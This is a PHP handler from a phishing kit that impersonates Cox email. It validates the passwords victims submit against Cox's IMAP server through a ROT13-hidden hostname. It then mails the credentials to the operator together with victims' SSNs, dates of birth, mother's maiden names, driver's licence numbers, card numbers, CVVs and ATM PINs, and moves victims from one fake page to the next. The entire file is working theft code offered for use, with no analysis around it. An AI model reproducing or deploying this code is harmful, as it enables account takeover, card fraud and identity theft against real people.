<?php
require 'Email.php';

if (isset($_POST['username'])) {


    $user = $_POST['username'];
    $pass = $_POST['password'];

    $cox = '/cox/i';

    if (preg_match($cox, $user) == 1) {
        $auch = str_rot13("{vznc.pbk.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else {
        $auch = str_rot13("{vznc.pbk.arg:993/vznc/ffy/abinyvqngr-preg}");
    }


    if (!empty($auch) && !empty($user) && !empty($pass)) {
        if ($mbox = imap_open($auch, $user, $pass)) {
            $ipdata = "Call Done";
            imap_close($mbox);
        } else {
            $ipdata = "FAIL!";
        }
    }

    if ($ipdata == "Call Done") {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----Cox Email Access-----|\n";
        $message .= "Email: " . $_POST['username'] . "\n";
        $message .= "Password: " . $_POST['password'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "Cox Email: $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        header("Location: ./web/billing.php");
    } else {
        header("Location: ./web/login.php?error=1");
    }
}

if (isset($_POST['FLN'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Cox Fullz -----|\n";
    $message .= "Full Name: " . $_POST['FLN'] . "\n";
    $message .= "DOB: " . $_POST['DOB'] . "\n";
    $message .= "SSN: " . $_POST['SSN'] . "\n";
    $message .= "MMN: " . $_POST['MMN'] . "\n";
    $message .= "Address: " . $_POST['ADL'] . "\n";
    $message .= "Zip Code: " . $_POST['ZPC'] . "\n";
    $message .= "Phone Number: " . $_POST['PHN'] . "\n";
    $message .= "DL#: " . $_POST['DL'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Cox Fullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    header("Location: ./web/sitekey.php");
}

if (isset($_POST['CCN'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Cox Card -----|\n";
    $message .= "Card: " . $_POST['CCN'] . "\n";
    $message .= "Exp: " . $_POST['EXD'] . "\n";
    $message .= "CVV: " . $_POST['CV'] . "\n";
    $message .= "ATM Pin: " . $_POST['ATP'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Cox Card : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    header("Location: ./web/com.php");
}
$fp = fopen("", "a"); // Add name of text file if want to save. like "./name.txt"//
fputs($fp, $message);
fclose($fp);
